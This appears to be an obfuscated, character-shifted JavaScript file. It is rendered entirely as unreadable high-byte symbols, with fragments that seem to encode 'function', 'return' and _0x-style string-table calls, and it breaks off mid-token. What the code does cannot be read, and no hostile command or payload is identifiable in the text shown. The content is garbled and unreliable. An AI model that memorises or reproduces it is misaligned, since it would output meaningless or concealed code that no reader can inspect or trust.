å½±°ª·°«»å£¼¬»¿µå££ò½¿°­»±³³¿°º­ãö¥³±º»äò¸¬±³¬±«®äò­»°º»¬äò¸¬±³»äò­»°º»¬«³ä£÷ãà¥½±°­ªþ»ã¿ò©ã¥ù²¤ùä¸«°½ª·±°ö¯ò÷¥¬»ª«¬°þ¯ÿããå£òù¿©¨¨ùä»öî¦íë½òùîù÷õùîæùòù¦³ùä¸«°½ª·±°ö¯òò¸÷¥¬»ª«¬°þ¯öò¸÷å£òù¹»§ùä¸«°½ª·±°ö¯ò÷¥¬»ª«¬°þ¯ö÷å£òù²¼¶ºùä¸«°½ª·±°ö¯ò÷¥¬»ª«¬°þ¯¢¢å£òù³ºùä»öî¦ï¸¸òù§ç¶ù÷òù³µ¼ùä¸«°½ª·±°ö¯ò÷¥¬»ª«¬°þ¯ãããå£òù°ùä»öî¦ê½ºòù¦µù÷òù¼³ùä¸«°½ª·±°ö¯ò÷¥¬»ª«¬°þ¯ãããå£òù´·³ùä»öî¦èêºòùë¼ù÷òù¹¼ùä»öî¦èè¸òù®ù÷£å·¸öÿøø©»öî¦íïêòùì±ù÷öò©»öî¦çì¼òù°ç¬ù÷÷øø©»öî¦¼»òù²êöêù÷ö·­¿°°»ºòò÷÷¬»ª«¬°ÿå½±°­ªþªã©»öî¦éì¿òùî½ù÷öª¬·°¹ò©»öî¦ííèòùî³íù÷öò©»öî¦ëëçòù±ëù÷÷÷»öî¦ææçòùµ³ïù÷õù»ùö÷òã©»öî¦æêëòù÷¬û½ù÷ö·­«º±òò÷¢¢¢¢©»öî¦è¿¸òù¦±ù÷öò©»öî¦èêïòùæù÷÷å·¸ö÷¬»ª«¬°ÿÿå·¸ö©»öî¦èèìòùôëù÷öªò©»öî¦èææòùîù÷÷÷¬»ª«¬°ÿå·¸ö©»öî¦æîêòùé´ù÷öªò©»öî¦êíæòùêïù÷÷÷¬»ª«¬°ÿå·¸ö©»öî¦êè¿òùê©¯ù÷öªò©»öî¦ìíêòùºëèù÷÷÷¬»ª«¬°þå¬»ª«¬°ÿÿå£ò¹»ª¬»¸·¦ãö÷ãà½±°¸·¹¿öî¦ï½¸òùæù÷¢¢º»¸¿«²ª­¿öî¦ïæëòù½«ù÷¢¢ùðùò·­¬±«®ã³ãà³¿öî¦é»¸òùéÿ­ù÷ö¿öî¦ë»¿òù·¼ïù÷÷ò¹»ª¬±«®»ªª·°¹­ããà¥½±°­ªþã¿òã¥£åöî¦é½ºòùì±ù÷ãöî¦ë¸îòù«®³ù÷òöî¦íºæòù·êù÷ãöî¦éëëòù¨§ù÷õöî¦æ½îòùé´ù÷òöî¦æ¿½òùù÷ãöî¦ì½æòù½«ù÷å½±°­ªþãåª¬§¥½±°­ªþã®¿ª¶öî¦ëíºòù±ëù÷öº·¬°¿³»òöî¦íéîòù´ºù÷ò÷òã®¿ª¶öî¦æè»òùµýù÷öòöî¦íºæòù·êù÷÷å·¸öÿ¸­öî¦é¼ëòù±ëù÷ö÷÷¬»ª«¬°¥£å¬»ª«¬°þöî¦ìëºòù­¦êù÷ö¸­öî¦ìêëòù¹½ù÷õù°½ùöòöî¦éæ¿òùë¼ù÷÷÷å£½¿ª½¶ö©÷¥¬»ª«¬°¥£å££ò¹»ª±º§ããà¥½±°­ªþã¿òãöî¦èêéòùéÿ­ù÷å·¸öÿ÷¬»ª«¬°ùùå¬»ª«¬°þöî¦èî½òùìù÷õù±°ù¢¢öî¦ïèéòùë¼ù÷õöî¦é¿éòù¤û»ù÷øøöî¦íëºòùÿéù÷õöî¦æ¼éòù´ºù÷öî¦êèìòù¸é¶ù÷¢¢öî¦ë¿¼òù·êù÷õù¹»ùøøöî¦í¸éòù¿³½éù÷õù¹»ùöî¦íê¼òù¶ªëù÷¢¢öî¦ìê¸òùê©¯ù÷õù¹»ùøøöî¦çæ½òù°ù÷õù¹»ùöî¦ìçæòùé´ù÷¢¢öî¦éæìòùù÷õöî¦ç¿½òù¸èù÷õù¹»ùøøöî¦ç»êòù´ºù÷õöî¦ëº¸òù§ç¶ù÷õù¹»ùöî¦ì»ìòù°ç¬ù÷õöî¦íèéòù«¹¤ù÷¢¢öî¦íïéòùÿéù÷õöî¦éçºòù¸é¶ù÷øøöî¦íéêòùôëù÷õöî¦æí¼òùù÷öî¦ëíæòùµ¤¼ûù÷õöî¦èê¼òù®ù÷øøöî¦íéêòùôëù÷õöî¦ïëìòù´ºù÷öî¦ìæìòùì±ù÷õöî¦èîíòù­¦êù÷öî¦ïìéòùºëèù÷õöî¦ç»èòù÷¬û½ù÷¢¢ùùå£ò¹»ª­¹§®»ããà¥½±°­ªþ«ã¿òã¥£å«öî¦ççæòùµ¤¼ûù÷ã«öî¦ïéºòù´ºù÷å½±°­ªþãòã«öî¦æï½òùÿéù÷å·¸öÿ÷¬»ª«¬°þ«öî¦æç¸òù¨§ù÷å¬»ª«¬°þ¼´»½ª«öî¦ë¼¼òù«¹¤ù÷ö÷î¦ï¼êéôóî¦ïõî¦ïè¿¿õî¦êçº¢¢«öî¦ïîèòùé¸ù÷å£ò¹»ª«±ª»ºããà¥½±°­ªþã¿òã¥£åöî¦ç¿¸òùºëèù÷ã¸«°½ª·±°ö¯ò÷¥¬»ª«¬°þ¯ÿããå£òöî¦æ¸æòùìù÷ãöî¦çï¼òù÷¬û½ù÷òöî¦çè¼òùÿéù÷ãöî¦æ¿ëòùî³íù÷òöî¦êìîòù°ç¬ù÷ã¸«°½ª·±°ö¯ò÷¥¬»ª«¬°þ¯ãããå£òöî¦æççòù·êù÷ãöî¦íæêòù¸é¶ù÷å½±°­ªþ©ãòªãöî¦éî¿òùî³íù÷å·¸öÿª÷¬»ª«¬°þ°«²²å½±°­ªþãªöî¦æ¼êòùîù÷õöî¦èçéòùé¸ù÷å·¸öøøöî¦íïçòù±ëù÷õù±ùøøöî¦éîèòùéÿ­ù÷õù±ùöî¦èëçòùÿéù÷õöî¦íè»òùµ¤¼ûù÷÷¥½±°­ªþ¯ã¥£å¬»ª«¬°þ¯öî¦æï½òùÿéù÷ãöî¦çæ¸òùîù÷õù±ùöî¦ëîíòùîù÷õöî¦çééòùî³íù÷ò¯öî¦éè½òù½«ù÷ãöî¦ëéîòù¤û»ù÷õù±ùöî¦èìçòù­¤ù÷õùªù¢¢öî¦è¼¸òù®ù÷õù±ùöî¦íï»òù³ù÷ò¯öî¦ë½ìòùéÿ­ù÷ãöî¦íººòùæù÷õù±ùöî¦ïç¼òù¦±ù÷ò¯å£¸±¬ö½±°­ªþþ±¸þ¼´»½ªöî¦ê»½òùôûù÷öª÷÷¥·¸ö©öî¦ç¿ìòùé¸ù÷ö©öî¦ïï»òùî½ù÷ò©öî¦çëêòù´ºù÷÷÷¥½±°­ªþ¸ãªå·¸ö¸øø¸öî¦è½íòù­¤ù÷õù±ùøø¸öî¦é¿ìòùê©¯ù÷õù±ùöî¦çç¿òù·êù÷õöî¦êè½òù¦µù÷÷¥·¸ö©öî¦ïìëòùî½ù÷ö©öî¦í½ïòùìù÷ò©öî¦ìºæòù´ºù÷÷÷¥½±°­ªþ¶ã¥£å¬»ª«¬°þ¶öî¦è¿¿òùé´ù÷ã¸öî¦è¸½òùµ¤¼ûù÷õù±ùöî¦êíéòù¸èù÷õöî¦í»¼òù«¹¤ù÷ò¶öî¦ïï¸òùµ¤¼ûù÷ã¸öî¦ìêíòù¹½ù÷õù±ùöî¦éììòù°ç¬ù÷õùªù¢¢öî¦ïë¼òù·¼ïù÷õù±ùöî¦ïéîòùé¸ù÷ò¶öî¦íí»òù«¹¤ù÷ã¸öî¦¼ëòù°ù÷õù±ùöî¦é¸êòùôëù÷ò¶å£»²­»þ¬»ª«¬°¥£å££»²­»þãå£¬»ª«¬°þ°«²²å£ò¹»ª»°ª·±°­ããà¥½±°­ªþ·ã¿òã¥ù©¿ùä¸«°½ª·±°öòò©÷¥¬»ª«¬°þöò©÷å£òù³¦¸ùä¸«°½ª·±°öò÷¥¬»ª«¬°þ¢¢å£òùª²ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òùùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù¸©ªùä·öî¦íììòù¿³½éù÷òùºùä·öî¦çêïòùîù÷£òã·öî¦è¿æòùù÷å·¸öÿ÷¬»ª«¬°å¸±¬ö½±°­ªþþ±¸þ¼´»½ª·öî¦êïëòùéÿ­ù÷ö÷÷¥·¸ö·öî¦çèíòù­¤ù÷ö·öî¦æê¼òùì±ù÷ò·öî¦çîíòù¦±ù÷÷÷¥·¸ö·öî¦éê»òùî½ù÷öÿ¸òÿ¶÷÷¬»ª«¬°å·öî¦ëëìòù«®³ù÷öòö÷ãà¥½±°­ªþ³îã·åª¬§¥·¸ö¬÷³îöî¦ìæ¸òù²êöêù÷ö­òò¨÷å·¸ö÷³îöî¦ì¸ºòùë¼ù÷öò²ò¹÷å£½¿ª½¶öµ÷¥££÷å£»²­»¥½±°­ªþ©ãøø·öî¦ëéîòù¤û»ù÷õù±ùøø·öî¦é½ëòùÿéù÷õù±ù·öî¦ïë»òùÿéù÷õù·ºùå·¸ö©øø©·öî¦ºæòùî½ù÷÷¬»ª«¬°þ©å££¬»ª«¬°å£ò·­·»©°½»ããà¥½±°­ªþ³ïã¿òã³ïöî¦ê¸»òùë¼ù÷å·¸öÿ÷¬»ª«¬°ÿå·¸ö³ïöî¦ëæïòùµ³ïù÷õ³ïöî¦êº½òùé¸ù÷¢¢³ïöî¦æ¸»òù¦±ù÷õ³ïöî¦ïìæòùîù÷¢¢³ïöî¦çè¿òù§ç¶ù÷õ³ïöî¦çë¿òù¸é¶ù÷õ³ïöî¦éê¸òù¹½ù÷÷¬»ª«¬°ÿÿå·¸ö³ïöî¦ìé»òùù÷õù¹»ùøø³ïöî¦íº½òù­¤ù÷õù¹»ù³ïöî¦ê¿êòù¿³½éù÷÷¬»ª«¬°ÿÿå·¸ö³ïöî¦ëêêòùµ¤¼ûù÷õù¹»ùøø³ïöî¦ïïçòù²êöêù÷õù¹»ù³ïöî¦íïïòùéÿ­ù÷÷¬»ª«¬°ÿÿå¬»ª«¬°ÿå£ò¹»ª·»©°½»±°ª»°ªããà¥½±°­ªþ³ìã¿òã³ìöî¦ïº½òù·¼ïù÷å·¸öÿ÷¬»ª«¬°þ°«²²å·¸ö³ìöî¦ê»¸òù¨§ù÷õ³ìöî¦èìæòùîù÷øø³ìöî¦éîìòùîù÷õ³ìöî¦èïïòù§ç¶ù÷³ìöî¦çí¿òù«®³ù÷÷¬»ª«¬°þ³ìöî¦èæîòùéÿ­ù÷õ³ìöî¦ïë¸òù®ù÷³ìöî¦íê¸òùµýù÷å·¸ö³ìöî¦é¼»òù¦µù÷õ³ìöî¦æ¿íòù¹½ù÷øø³ìöî¦ï½êòù¤û»ù÷õ³ìöî¦é½êòùºëèù÷³ìöî¦êè¼òù¨§ù÷÷¬»ª«¬°þ³ìöî¦êèéòù­¦êù÷õ³ìöî¦íëéòùù÷³ìöî¦êééòùîù÷å·¸ö³ìöî¦çæ¼òù²êöêù÷õ³ìöî¦ê»¿òùæù÷õ³ìöî¦èéîòùìù÷øø³ìöî¦ïïîòù¸é¶ù÷õ³ìöî¦ç¿èòù­¦êù÷õ³ìöî¦è¿»òùì±ù÷³ìöî¦ï¸ïòù¦±ù÷÷¬»ª«¬°þ³ìöî¦ììîòùì±ù÷õ³ìöî¦êïêòùéÿ­ù÷õ³ìöî¦ï¿ïòù¿³½éù÷³ìöî¦ºéòù°ù÷å·¸ö³ìöî¦æëíòùé´ù÷õù¹»ùøø³ìöî¦êí¼òùî½ù÷õù¹»ù³ìöî¦ìºíòù­¦êù÷÷¬»ª«¬°þå·¸ö³ìöî¦çæ½òù°ù÷õù¹»ùøø³ìöî¦ëêêòùµ¤¼ûù÷õù¹»ù³ìöî¦íæíòù¬ù÷÷¬»ª«¬°þå¬»ª«¬°þ°«²²å£ò·­«±ª»º·»©°½»ããà¥½±°­ªþ³íã¿òã¥£å³íöî¦æî½òùç®ù÷ã³íöî¦»æòùë¼ù÷å½±°­ªþãòã³íöî¦è¸¼òùéÿ­ù÷³íöî¦ëêëòù·êù÷öù¢ù÷å²»ªþãóî¦ïæôóî¦ïºõóî¦êôî¦êïìõî¦ºçîå©¶·²»öÿÿ÷¥­©·ª½¶öõõ÷¥½¿­»ùîùä·¸ö³íöî¦èçºòùêïù÷õù¹»ùøø³íöî¦èºèòù´ºù÷õù¹»ù³íöî¦éè»òùÿéù÷÷¬»ª«¬°ÿÿå½±°ª·°«»å½¿­»ùïùä¬»ª«¬°ÿå½¿­»ùìùä·¸ö³íöî¦çéæòùºëèù÷õù¹»ùøø³íöî¦ïï¿òùë¼ù÷õù¹»ù³íöî¦çºæòùî½ù÷÷¬»ª«¬°ÿÿå½±°ª·°«»å½¿­»ùíùä·¸öÿ÷¬»ª«¬°ÿå½±°ª·°«»å½¿­»ùêùä·¸ö³íöî¦ïéçòùæù÷õ³íöî¦ëíèòù°ù÷¢¢³íöî¦ëïèòù¸èù÷õ³íöî¦éî¸òù¨§ù÷¢¢³íöî¦¸ìòùë¼ù÷õ³íöî¦æçºòù½«ù÷õ³íöî¦êéèòùé¸ù÷÷¬»ª«¬°ÿÿå½±°ª·°«»å£¼¬»¿µå££ò­»°º»®²§ã¿­§°½öòòò÷ãà¥½±°­ªþ³êã¿òã¥£å³êöî¦æííòù³ù÷ã¸«°½ª·±°öªò÷¥¬»ª«¬°þªõå£ò³êöî¦ïºìòùç®ù÷ã³êöî¦èç¼òù¸èù÷õùä¦ìîùå½±°­ªþ©ãåª¬§¥½±°­ªþªãá¥ù¯«±ª»ºùä£ä¥£å¿©¿·ªþ³êöî¦êìèòù¤û»ù÷õù»ùöòòª÷å£½¿ª½¶ö÷¥²±¹¹»¬³êöî¦éìíòùÿéù÷ö©³êöî¦æíëòù¦±ù÷ö©³êöî¦æºèòùôëù÷ò³êöî¦êééòùîù÷÷÷å££ò¬»­±²¨»¬±«®¿³»ã¿­§°½ö³ò÷ãà¥½±°­ªþ³ëã¿åª¬§¥½±°­ªþã¿©¿·ªþ³³ëöî¦é¼¸òù¦µù÷õ³ëöî¦ç¸ïòùù÷ö÷å¬»ª«¬°þ³ëöî¦èæéòùç®ù÷¢¢å£½¿ª½¶ö÷¥¬»ª«¬°þå££ò²»¿¬°²·¿­ãö³òòò÷ãà¥½±°­ªþ³èã¿òã¥ù¹»ùä¸«°½ª·±°öò©òª÷¥¬»ª«¬°þö©òª÷å£òù¨»ùä¸«°½ª·±°öò©÷¥¬»ª«¬°þ¢¢©å£òù¼²ùä¸«°½ª·±°öò©÷¥¬»ª«¬°þö©÷å££å·¸ö³èöî¦íº»òù¨§ù÷öÿ³òÿ÷÷¬»ª«¬°å³èöî¦é¸ºòù´ºù÷ö­»ª³³»º·¿ª»òö÷ãà¥½±°­ªþ³éã³èåª¬§¥·¸ö÷³éöî¦ç»¼òù·êù÷ö¿ºº«º±²·¿­òò³÷å·¸ö÷³éöî¦ê¼êòùµýù÷ö¿ºº¿°²·¿­òò³÷å£½¿ª½¶ö÷¥££÷å£å³±º«²»¿öî¦ï¿¸òùµ¤¼ûù÷ã¿­§°½ö³ò÷ãà¥½±°­ªþ³æã¿òã¥ù­¦µùä³æöî¦ï»çòù·êù÷òù»ùä¸«°½ª·±°öòò÷¥¬»ª«¬°þöò÷å£òù«¯¶ùä¸«°½ª·±°öò÷¥¬»ª«¬°þàå£òù¤¿ùä¸«°½ª·±°öò÷¥¬»ª«¬°þóå£òù­ùä¸«°½ª·±°öò÷¥¬»ª«¬°þôå£òù»¯ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù­¼ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òù·¿¸ùä³æöî¦èé¿òù¦µù÷òù¯¿ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù°¦¶ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù´ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù³¶°ùä³æöî¦»èòùù÷òù¼´ùä³æöî¦æ»¿òù¦µù÷òù¤°ùä³æöî¦í¸îòù¨§ù÷òù²¶ùä³æöî¦çì½òùë¼ù÷õ³æöî¦êæìòùù÷òù¨³ùä³æöî¦ì»èòù­¤ù÷òùùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù»½ùä³æöî¦ïºîòù°ù÷òù¦ùä³æöî¦ê½¸òù²êöêù÷òù´®¶¬ùä¸«°½ª·±°öò÷¥¬»ª«¬°þÿãå£òùº¼ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù»¹ùä³æöî¦ìéíòùæù÷õ³æöî¦ë¿¿òùìù÷òù²©ùä³æöî¦ìï¼òù®ù÷õùùòù¦©­ªùä¸«°½ª·±°öòòò©òª÷¥¬»ª«¬°þöòò©òª÷å£òù¿ºùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òùµ®ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù·¹¤­ùä³æöî¦íèºòùµ¤¼ûù÷õ³æöî¦ììíòù¤û»ù÷õ³æöî¦æíèòùôûù÷òù±¶ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù¿½ùä³æöî¦êçæòùìù÷õù§¦ìîùòù»¼µùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù®¹¤¹ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òùº²­ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù¨±©±ùä³æöî¦êçèòù´ºù÷õùô¦ìîùòù¶¬­ùä³æöî¦ìîïòùìù÷õ³æöî¦é¿¿òù­¦êù÷òù¶§ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù¹ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù·ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù¬ºùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù¦¸ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù»º°ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù»µ·ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù®©ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù¹»ùä³æöî¦ë¼ëòùµ³ïù÷õ³æöî¦é»éòù½«ù÷òùµ´ùä³æöî¦ì»¼òùîù÷õ³æöî¦æ¿ºòùµýù÷õ³æöî¦æ¼¿òù²êöêù÷òùùä³æöî¦ïëéòùë¼ù÷õ³æöî¦é¸½òùÿéù÷òù­·ùä³æöî¦êî¸òù¹½ù÷õ³æöî¦æ¿çòù°ç¬ù÷òù¤·ùä³æöî¦êê½òùºëèù÷õùô¦ìîùòùª¬»ùä³æöî¦í¸½òùé¸ù÷õ³æöî¦ç¼ëòùîù÷òù½¤¶¬ùä³æöî¦ç»ëòùì±ù÷õ³æöî¦ëºêòù²êöêù÷òù«ùä³æöî¦æëæòùì±ù÷õ³æöî¦ìæéòù®ù÷òù¹ùä¸«°½ª·±°öò÷¥¬»ª«¬°þÿããå£òù¹ùä³æöî¦ìë½òùìù÷òù»¤°ùä³æöî¦ïè»òùî½ù÷òù·®ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òùº»º²ùä³æöî¦èè½òùôëù÷òù¤­©¬§ùä³æöî¦èëîòù«®³ù÷õ³æöî¦æé»òùµ¤¼ûù÷õ³æöî¦ìîæòù¦µù÷òù¿¬ùä³æöî¦æíéòùôûù÷òù±ùä³æöî¦ë»êòù½«ù÷òù½¼§±²ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù¬¤¹¯ùä³æöî¦í»ïòùºëèù÷òù©¹«ùä³æöî¦ìç¸òùë¼ù÷õ³æöî¦í¸çòù­¦êù÷õù«­ùòù»¶¹ùä¸«°½ª·±°öò÷¥¬»ª«¬°þÿãå£òù¸´±ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù²¤ùä³æöî¦èº¼òùæù÷òù§¶º¬ùä³æöî¦éïèòùæù÷òù²¸²¯ùä³æöî¦ééçòù°ç¬ù÷õ³æöî¦ê¼æòùêïù÷õùä¦ìîùòùª¦¿ùä³æöî¦ï»½òùì±ù÷õ³æöî¦çîïòùôûù÷õùä¦ìîùòùùä³æöî¦ï¸îòùîù÷òù¶»¤ùä¸«°½ª·±°öò÷¥¬»ª«¬°þ¢¢å£òù«°ùä³æöî¦æîîòùîù÷òù½²²±¨ùä³æöî¦ëé¸òù¶ªëù÷õùïùòù¹ªùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òù³¦¿ùä¸«°½ª·±°öò÷¥¬»ª«¬°þÿããå£òùªùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òù¤¼¨·½ùä³æöî¦ïæ¼òù¤û»ù÷òù§ùä³æöî¦ëçíòùé´ù÷õ³æöî¦ìêéòùµ³ïù÷òù±©´ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù¹²¦ùä³æöî¦è¿îòù´ºù÷òù¦¸¼´¼ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù¨¶¦¬ùä³æöî¦çè½òù¨§ù÷òù¬¯ùä³æöî¦æºæòùé´ù÷òù®ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù¼¬±©¸ùä¸«°½ª·±°öòòò©òª÷¥¬»ª«¬°þöòò©òª÷å£òùº¨±²¹ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òù¨¤ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òùµ¸ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù±´¤¼ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù½®¤ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù¨ùä¸«°½ª·±°öò÷¥¬»ª«¬°þ¢¢å£òù§³ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òù¼°¿ùä¸«°½ª·±°öò÷¥¬»ª«¬°þÿãå£òùª®¬ùä³æöî¦éíæòùé´ù÷òù¶«­¯ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òùº½ùä³æöî¦éé½òùºëèù÷òù»·­§ùä³æöî¦ì»¿òùç®ù÷òùª´³ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òù¼§ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òùµ¹ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù»ùä³æöî¦èîçòù÷¬û½ù÷òù²¬ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òù´ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òù¬½»ùä³æöî¦êºéòùù÷õù»ùòù¯·µùä³æöî¦ï½îòù½«ù÷òù¸«ª¹ùä³æöî¦ïé½òù¸é¶ù÷òùºùä³æöî¦è¸êòù±ëù÷òù¿ùä³æöî¦íî¼òù­¤ù÷òù­¸ùä³æöî¦ëîæòùç®ù÷õ³æöî¦íêîòù³ù÷òù­²¤¶ùä³æöî¦ëììòùî½ù÷òùº¤ùä³æöî¦êï¼òù¿³½éù÷òù²¼µùä¸«°½ª·±°öò÷¥¬»ª«¬°þÿããå£òùª°­¹ùä³æöî¦éæçòùù÷òù¸«²¬ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù¸®ùä¸«°½ª·±°öò÷¥¬»ª«¬°þ¢¢å£òù³«´§ùä³æöî¦æéçòùé´ù÷òù­¬ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù¨°ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù°¼³ùä³æöî¦ë¸½òùê©¯ù÷òù¨§¯½ùä³æöî¦íëîòùºëèù÷òù§ùä³æöî¦èíæòùéÿ­ù÷òù§ªùä³æöî¦ëæ¿òù¸é¶ù÷òù¿¸¯ùä³æöî¦ïææòùë¼ù÷õù¦ìî¾ùòù¦²­ùä³æöî¦ïïïòùîù÷õ³æöî¦íí¼òùé´ù÷òùùä³æöî¦½éòù¦µù÷õùä¦ìîùòù³½²ùä³æöî¦»ëòù§ç¶ù÷òù¿ªùä³æöî¦íèíòù¤û»ù÷òù©´ùä³æöî¦æëèòù«®³ù÷òù½¶·ùä³æöî¦ìîíòù´ºù÷òù¤¯ùä³æöî¦è¸»òù±ëù÷òù¼ùä³æöî¦è½èòù°ù÷òùùä³æöî¦¼¿òùì±ù÷òùººùä³æöî¦ì½¿òùù÷òùªùä³æöî¦èé¸òù¸é¶ù÷òù¹ªùä³æöî¦ìéïòù¦µù÷òù¯ùä³æöî¦íèêòù§ç¶ù÷òù±µùä³æöî¦èæ½òù­¤ù÷òù²°ùä³æöî¦íìçòùç®ù÷õ³æöî¦ïººòùµýù÷òù³´¤¿ùä³æöî¦èçæòùÿéù÷òù¬ùä¸«°½ª·±°öò÷¥¬»ª«¬°þÿãå£òù¸«·¹ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù¹¯¬«³ùä³æöî¦íæîòùîù÷òù¶ùä¸«°½ª·±°öò÷¥¬»ª«¬°þÿãå£òù¸¶´ùä³æöî¦ïº¼òù÷¬û½ù÷òù©ª®¹ùä¸«°½ª·±°öò÷¥¬»ª«¬°þÿããå£òùµ­³¯ùä³æöî¦ççìòùîù÷òùª·ùä³æöî¦ïç½òù³ù÷òù°¤¤ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù¸ùä³æöî¦ëçæòù÷¬û½ù÷òù®«±ùä³æöî¦æëºòùÿéù÷òùº²©ùä¸«°½ª·±°öò÷¥¬»ª«¬°þÿããå£òù»±µùä³æöî¦çæçòù°ù÷òù©¹¯±ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù¶ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù¹ªùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù¹«»ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òùª¼ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù»¿ùä³æöî¦êî½òùê©¯ù÷òù¦®¹ùä³æöî¦ººòùºëèù÷òù°¿¿ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òù»¼²±¶ùä¸«°½ª·±°öò÷¥¬»ª«¬°þÿããå£òù±»ùä³æöî¦çëéòùéÿ­ù÷òùº©½±ùä³æöî¦èç½òù±ëù÷òù´­ùä³æöî¦ïí¼òù·êù÷òù­¬ªùä³æöî¦ïê¸òù¨§ù÷òù¯­°ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òù¯¯¤ùä³æöî¦êîæòùë¼ù÷òù¶ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òù§»¬ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òù¤±ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òù®¯±¿ùä³æöî¦ìººòù²êöêù÷òù©±µ½ùä³æöî¦ïîéòùê©¯ù÷òù´¨ùä¸«°½ª·±°öòòò©÷¥¬»ª«¬°þöòò©÷å£òùª¹ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òù·©ùä¸«°½ª·±°öò÷¥¬»ª«¬°þÿããå£òù­ùä³æöî¦æ¸ºòùéÿ­ù÷õùîæùòù©­¶°¼ùä³æöî¦æ¿ïòù­¦êù÷òù¬­ùä¸«°½ª·±°öòò÷¥¬»ª«¬°þöò÷å£òù¦§¶ùä¸«°½ª·±°öò÷¥¬»ª«¬°þÿããå£òù¹´µùä³æöî¦é½ìòùêïù÷òù¶¶µ¤ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù©¯¦ùä¸«°½ª·±°öò÷¥¬»ª«¬°þõå£òù¹¨±ùä³æöî¦ïîºòù½«ù÷õ³æöî¦ì¿ëòùé´ù÷òù´®ùä³æöî¦ëèíòù·êù÷òùº½ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òù­ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òù¤°¦¬ùä¸«°½ª·±°öò÷¥¬»ª«¬°þö÷å£òù½©¼³ùä¸«°½ª·±°öò÷¥¬»ª«¬°þ¢¢å£òù¬¿ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù·¼ùä³æöî¦ííëòù§ç¶ù÷õù¹»ùòù­·¬ùä³æöî¦æí¿òùºëèù÷òù¿ùä³æöî¦í¿ºòùî³íù÷òù¤ùä³æöî¦ëº¼òùîù÷õù¹»ùòù¬ùä³æöî¦éº¼òùÿéù÷òùµ¨ùä³æöî¦è¿íòù­¦êù÷òù½ºùä³æöî¦íîìòù´ºù÷òùº»ºùä³æöî¦íêêòù÷¬û½ù÷òù»ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù««ùä³æöî¦íî¿òù°ù÷õù¹»ùòù«­¿¼ùä³æöî¦è¼èòù¦±ù÷òù°¿ùä³æöî¦ïæìòù¸èù÷òù¦°¸ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù¯³ùä³æöî¦êçîòù°ç¬ù÷õ³æöî¦èë»òù§ç¶ù÷òù½ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù­ªùä³æöî¦ì¿»òù½«ù÷òù·ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù¨®°¶ùä³æöî¦íç¿òù±ëù÷õ³æöî¦íìºòùêïù÷òù´ùä¸«°½ª·±°öò÷¥¬»ª«¬°þãããå£òù´½®ùä³æöî¦êºèòù÷¬û½ù÷õ³æöî¦èïíòù²êöêù÷òùª¦¨ºùä³æöî¦í¸ìòù